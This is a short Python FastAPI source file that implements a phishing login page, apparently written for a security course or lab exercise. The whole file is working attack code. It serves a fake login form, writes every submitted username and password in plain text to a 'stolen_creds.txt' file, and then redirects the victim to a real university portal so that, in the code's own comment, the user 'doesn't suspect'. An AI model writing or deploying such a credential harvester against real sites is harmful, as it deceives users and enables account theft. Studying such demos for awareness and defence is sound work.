from fastapi import FastAPI, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from starlette.requests import Request

app = FastAPI()

# Mount your static files (for the logo and CSS)
app.mount("/static", StaticFiles(directory="phase1/app/static"), name="static")
templates = Jinja2Templates(directory="phase1/app/templates")

@app.get("/", response_class=HTMLResponse)
async def get_login(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.post("/login")
async def capture_credentials(username: str = Form(...), password: str = Form(...)):
    # 1. Save credentials to a.txt file [cite: 64, 68]
    with open("phase1/app/stolen_creds.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")
    
    # 2. Redirect to the real portal so user doesn't suspect [cite: 65]
    return RedirectResponse(url="https://e3p.nycu.edu.tw/login/index.php", status_code=303)